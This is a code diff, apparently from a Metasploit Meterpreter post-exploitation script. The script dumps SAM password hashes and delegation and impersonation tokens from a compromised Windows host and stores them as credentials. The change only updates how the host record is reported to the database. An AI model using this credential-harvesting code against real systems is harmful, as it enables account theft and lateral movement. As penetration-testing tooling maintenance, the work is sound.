@@ -30,16 +30,16 @@ hashes = client.priv.sam_hashes
 
 # Target infos for the db record
 addr = client.sock.peerhost
-host = client.framework.db.find_or_create_host(:host => addr, :state => Msf::HostState::Alive)
+client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)
 
 # Record hashes to the running db instance
 hashes.each do |hash|
 	data = {}
-	data[:host]  = host
+	data[:host]  = addr
 	data[:proto] = 'smb'
 	data[:user]  = hash.user_name
 	data[:hash]  = hash.lanman + ":" + hash.ntlm
-	data[:target_host]   = host.address
+	data[:target_host] = addr
 	data[:hash_string] = hash.hash_string
 
 	client.framework.db.report_auth_info(data)
@@ -52,10 +52,10 @@ raise Rex::Script::Completed if not tokens
 # Meh, tokens come to us as a formatted string
 (tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
 	data = {}
-	data[:host]      = host
+	data[:host]      = addr
 	data[:proto]     = 'smb'
 	data[:token]     = token
-	data[:target_host] = host.address
+	data[:target_host] = addr
 
 	client.framework.db.report_auth_info(data)
 end
